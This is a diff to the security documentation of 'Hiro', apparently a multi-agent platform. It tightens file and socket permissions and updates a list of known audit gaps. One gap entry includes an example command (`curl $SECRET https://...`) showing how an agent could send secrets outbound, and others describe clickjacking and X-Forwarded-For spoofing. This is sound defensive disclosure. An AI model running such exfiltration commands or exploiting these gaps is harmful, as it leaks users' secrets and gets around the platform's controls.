@@ -74,11 +74,11 @@ When running in Docker, each agent process runs as a dedicated Unix user from a 
 | `/hiro` | `2775` (setgid) | root:hiro-agents | Platform root. All agents can read and write. New files inherit the `hiro-agents` group. |
 | `agents/` | `2775` (setgid) | root:hiro-operators | Agent definitions. Readable by all (via "other" bits), writable by operator agents only. |
 | `skills/` | `2775` (setgid) | root:hiro-operators | Shared skills. Same access as `agents/`. |
-| `workspace/` | `0775` | root:hiro-agents | Shared collaborative space. All agents can read and write. |
+| `workspace/` | `2775` (setgid) | root:hiro-agents | Shared collaborative space. All agents can read and write. New files inherit the `hiro-agents` group. |
 | `instances/{id}/` | `0700` | agent-user | Private per-agent data (memory, identity, sessions with todos, scratch, tmp). Only the owning agent can access. |
 | `db/hiro.db` | default | root | Unified platform database (instances, sessions, messages, usage). Accessed only by the control plane process. |
-| `/opt/mise/` | `2775` (setgid) | root:hiro-agents | Shared tool installations (mise, node, python, etc.). All agents can read, write, and install new tools. |
-| Agent socket | default | agent-user | gRPC server for control plane→worker calls. Located at `/tmp/hiro-agent-{session-id}.sock`. |
+| `/opt/mise/` | `r-x` (group) | root:hiro-agents | Shared tool installations (mise, node, python, etc.). Read-only for agents; new tools should be installed in per-instance directories. |
+| Agent socket | `0600` | agent-user | gRPC server for control plane→worker calls. Located at `/tmp/hiro-{session-prefix}/a.sock` (directory `0700`, owned by agent UID). |
 
 ### 5. Tool Capability System
 
@@ -119,7 +119,7 @@ Agents can only manage their own descendants. This is enforced by the `ScopedMan
 
 1. Each instance's inference loop receives its instance ID as a `callerID` via context propagation.
 2. Management tools (`SendMessage`, `StopInstance`, etc.) extract the caller ID from context and create a `ScopedManager` that checks descendant relationships before executing operations.
-3. `ScopedManager.checkDescendant()` calls `IsDescendant(targetID, callerID)` via the platform DB. If the target is not a descendant of the caller, the request is rejected.
+3. `ScopedManager.checkDescendant()` calls `IsDescendant(targetID, callerID)` via the in-memory instance tree. If the target is not a descendant of the caller, the request is rejected.
 
 **Scoping rules:**
 
@@ -185,8 +185,8 @@ The following are known security gaps identified during audit, tracked for futur
 - **Secret exfiltration via outbound Bash.** An agent with Bash access can read `$SECRET` and send it outbound (e.g., `curl $SECRET https://...`) in a single command. The output redactor cannot catch values sent outbound rather than returned as output. Network isolation (`network.egress`) is the primary mitigation — agents that handle sensitive secrets should have restricted egress.
 - **Secrets sent for all tool calls.** Secret env vars are currently included in every `ExecuteTool` gRPC message, not just Bash calls. This widens the in-process exposure window. A future improvement should gate injection to Bash-only calls.
 - **Short secret redaction floor.** The output redactor only scrubs secrets with values of 8+ characters (`minSecretLen`). Shorter secrets (PINs, short tokens) may appear unredacted in tool output and conversation history.
-- **Session cookie lacks `Secure` flag.** The `hiro_session` cookie is `HttpOnly` + `SameSite=Strict` but not `Secure`, because Hiro commonly runs on local machines over HTTP. Deployments exposed to a network should use a TLS-terminating reverse proxy.
-- **No security response headers.** The HTTP server does not set `X-Frame-Options`, `Content-Security-Policy`, or `X-Content-Type-Options` globally. A clickjacking attack is possible if the dashboard is embedded in an iframe on an attacker-controlled page.
+- **~~Session cookie lacks `Secure` flag.~~** Resolved. The `hiro_session` cookie now dynamically sets the `Secure` flag when the request arrives over TLS (direct or via trusted proxy with `X-Forwarded-Proto: https`).
+- **Incomplete security response headers.** `Content-Security-Policy` and `X-Content-Type-Options` are set on share and log endpoints, but not globally. `X-Frame-Options` is not set on any endpoint. A clickjacking attack is possible if the dashboard is embedded in an iframe on an attacker-controlled page.
 - **Share tokens do not expire.** File share tokens are valid for the lifetime of the session secret (rotated on password change). There is no per-token TTL.
 - **Share token key reuse.** The share token AES-GCM encryption key is the same as the session HMAC signing key. A future improvement should use HKDF derivation for a separate key.
 - **Rate limiter trusts `X-Forwarded-For` from private peers.** When behind a proxy that doesn't sanitize `X-Forwarded-For`, an attacker can inject arbitrary IPs to bypass the login rate limiter.
